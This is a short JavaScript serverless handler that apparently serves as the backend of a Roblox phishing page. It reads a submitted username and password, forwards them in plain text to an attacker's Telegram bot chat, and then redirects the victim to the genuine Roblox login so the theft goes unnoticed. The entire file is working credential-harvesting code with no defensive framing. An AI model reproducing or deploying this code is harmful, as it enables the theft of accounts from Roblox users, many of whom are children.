export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  let body = '';
  for await (const chunk of req) body += chunk;

  const params = new URLSearchParams(body);
  const username = params.get('username') || '';
  const password = params.get('password') || '';

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  const text = `Username: ${username}\nPassword: ${password}`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text })
  });

  res.writeHead(302, { Location: 'https://www.roblox.com/login' });
  res.end();
}
